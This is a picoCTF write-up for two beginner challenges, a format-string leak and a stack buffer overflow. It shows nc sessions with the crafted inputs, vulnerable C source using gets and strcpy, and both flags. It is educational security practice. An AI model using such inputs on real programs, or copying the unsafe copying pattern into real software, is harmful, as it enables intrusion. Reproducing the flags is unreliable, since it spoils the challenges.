# Format String 0


**Flag**= `picoCTF{7h3_cu570m3r_15_n3v3r_SEGFAULT_a1d85b3e}`

This challenge required us to use knowledge on format specifiers to get the flag.
One of the hints on this challenge encouraged me to look up info about format specifiers.

I found out that these are commonly used placeholders for data input and output in functions like scanf and printf in languages like C and C++.
``%s, %d, %x, %p`` etc. are some examples.
They always begin with % symbol which is used to indicate them being a format specifier.
Exploitation on these can be done through leaking the data from stacks and by repeatedly giving format specifiers like these, an attacker can read things from the stack which includes addresses and variables.


So with this knowledge I went ahead and started the challenge in my webshell terminal on picoCTF.
Each time, I just selected the option with % in it and arrived at the flag pretty easily.

```bash
Sylvaris-picoctf@webshell:~$ nc mimas.picoctf.net 55232
Welcome to our newly-opened burger place Pico 'n Patty! Can you help the picky customers find their favorite burger?
Here comes the first customer Patrick who wants a giant bite.
Please choose from the following burgers: Breakf@st_Burger, Gr%114d_Cheese, Bac0n_D3luxe
Enter your recommendation: Gr%114d_Cheese
Gr                                                                                                           4202954_Cheese
Good job! Patrick is happy! Now can you serve the second customer?
Sponge Bob wants something outrageous that would break the shop (better be served quick before the shop owner kicks you out!)
Please choose from the following burgers: Pe%to_Portobello, $outhwest_Burger, Cla%sic_Che%s%steak
Enter your recommendation: Cla%sic_Che%s%steak
ClaCla%sic_Che%s%steakic_Che(null)
picoCTF{7h3_cu570m3r_15_n3v3r_SEGFAULT_a1d85b3e}
```

References:

- Binary Exploitation: Format String Vulnerabilities by Vikie Li on Medium
- https://medium.com/swlh/binary-exploitation-format-string-vulnerabilities-70edd501c5be

# Buffer Overflow 0

**flag** = `picoCTF{ov3rfl0ws_ar3nt_that_bad_9f2364bc}`
I opened the source code on the webshell first 
```bash

Sylvaris-picoctf@webshell:~$ wget https://artifacts.picoctf.net/c/172/vuln.c
--2024-11-08 14:09:37--  https://artifacts.picoctf.net/c/172/vuln.c
Resolving artifacts.picoctf.net (artifacts.picoctf.net)... 3.160.5.93, 3.160.5.71, 3.160.5.42, ...
Connecting to artifacts.picoctf.net (artifacts.picoctf.net)|3.160.5.93|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 808 [application/octet-stream]
Saving to: 'vuln.c'

vuln.c               100%[====================>]     808  --.-KB/s    in 0s      

2024-11-08 14:09:37 (6.76 MB/s) - 'vuln.c' saved [808/808]

Sylvaris-picoctf@webshell:~$ cat vuln.c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <signal.h>

#define FLAGSIZE_MAX 64

char flag[FLAGSIZE_MAX];

void sigsegv_handler(int sig) {
  printf("%s\n", flag);
  fflush(stdout);
  exit(1);
}

void vuln(char *input){
  char buf2[16];
  strcpy(buf2, input);
}

int main(int argc, char **argv){
  
  FILE *f = fopen("flag.txt","r");
  if (f == NULL) {
    printf("%s %s", "Please create 'flag.txt' in this directory with your",
                    "own debugging flag.\n");
    exit(0);
  }
  
  fgets(flag,FLAGSIZE_MAX,f);
  signal(SIGSEGV, sigsegv_handler); // Set up signal handler
  
  gid_t gid = getegid();
  setresgid(gid, gid, gid);


  printf("Input: ");
  fflush(stdout);
  char buf1[100];
  gets(buf1); 
  vuln(buf1);
  printf("The program will exit now\n");
  return 0;
}
```
Here vuln function has a local buffer of size 16 bytes which meant that if we put in an input larger than 16 bytes, it will lead to a buffer overflow which is what the challenge required from us.
The function copies the input into buf2 which is what is vulnerable to the buffer overflow.

Hence I just connected to the challenge on the webshell and put in a sufficiently large strings of characters and got the flag.

```bash
Sylvaris-picoctf@webshell:~$ nc saturn.picoctf.net 52716
Input: haejfnoiffnergonergorngoegegprgrwfrf
picoCTF{ov3rfl0ws_ar3nt_that_bad_9f2364bc}
```

References:

-ChatGPT to understand the Vuln function.
